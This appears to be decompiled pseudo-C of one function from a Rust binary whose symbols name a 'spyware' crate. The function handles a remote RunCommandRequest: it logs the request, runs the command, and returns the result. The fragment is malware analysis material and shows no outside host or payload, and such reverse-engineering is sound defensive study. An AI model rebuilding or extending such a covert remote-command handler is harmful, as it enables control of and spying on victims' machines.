undefined4 *
_ZN7spyware7actions8commands19run_command_message17h528f548903eb1e39E
          (undefined4 *param_1,undefined8 *param_2)

{
  ulong uVar1;
  undefined *local_c8;
  undefined8 uStack_c0;
  undefined *local_b8;
  undefined8 local_b0;
  undefined8 local_a8;
  undefined8 *local_98;
  code *local_90;
  undefined **local_88;
  undefined8 uStack_80;
  undefined8 **local_78;
  undefined8 local_70;
  undefined8 local_68;
  undefined8 local_58;
  undefined8 uStack_50;
  undefined8 local_48;
  undefined8 *local_38;
  undefined4 uStack_30;
  undefined4 uStack_2c;
  undefined8 local_28;
  
  uVar1 = _ZN4core4sync6atomic11atomic_load17h8c88032dab18ab12E();
  if (3 < uVar1) {
    local_58 = &local_38;
    uStack_50 = _ZN44__LT__RF_T_u20_as_u20_core__fmt__Display_GT_3fmt17h5f99fd476a35f039E;
    local_88 = &PTR_DAT_001ba0b8;
    uStack_80 = 2;
    local_68 = 0;
    local_78 = (undefined8 **)&local_58;
    local_70 = 1;
    local_38 = param_2;
                    /* try { // try from 00159a84 to 00159ade has its CatchHandler @ 00159d3c */
    local_a8 = (*(code *)PTR__ZN3log13__private_api3loc17he75f2f86c1ff97b9E_001be620)
                         (&PTR_DAT_001ba0f8);
    local_c8 = &DAT_00113c7e;
    uStack_c0 = 0x1a;
    local_b8 = &DAT_00113c7e;
    local_b0 = 0x1a;
    _ZN3log13__private_api3log17h13afddf373bd7d7fE(&local_88,4,&local_c8);
  }
  _ZN7spyware7actions8commands11run_command17ha7c0eb7cdcbdbc69E(&local_38,param_2[1],param_2[2]);
  local_48 = local_28;
  local_58 = (undefined8 **)local_38;
  uStack_50 = (code *)CONCAT44(uStack_2c,uStack_30);
  uVar1 = _ZN4core4sync6atomic11atomic_load17h8c88032dab18ab12E();
  if (3 < uVar1) {
    local_98 = &local_58;
    local_90 = 
    _ZN60__LT_alloc__string__String_u20_as_u20_core__fmt__Display_GT_3fmt17h9e2c9c436a613463E;
    local_88 = &PTR_DAT_001ba0d8;
    uStack_80 = 1;
    local_68 = 0;
    local_78 = &local_98;
    local_70 = 1;
                    /* try { // try from 00159c8f to 00159cd4 has its CatchHandler @ 00159d1e */
    local_a8 = (*(code *)PTR__ZN3log13__private_api3loc17he75f2f86c1ff97b9E_001be620)
                         (&PTR_DAT_001ba110);
    local_c8 = &DAT_00113c7e;
    uStack_c0 = 0x1a;
    local_b8 = &DAT_00113c7e;
    local_b0 = 0x1a;
    _ZN3log13__private_api3log17h13afddf373bd7d7fE(&local_88,4,&local_c8);
  }
  *(undefined8 *)(param_1 + 4) = local_48;
  *param_1 = (undefined4)local_58;
  param_1[1] = local_58._4_4_;
  param_1[2] = (undefined4)uStack_50;
  param_1[3] = uStack_50._4_4_;
  *(undefined8 *)(param_1 + 6) = 0x8000000000000000;
  _ZN4core3ptr72drop_in_place_LT_spyware__communication__messages__RunCommandRequest_GT_17he0afe8a5e2188792E
            (param_2);
  return param_1;
}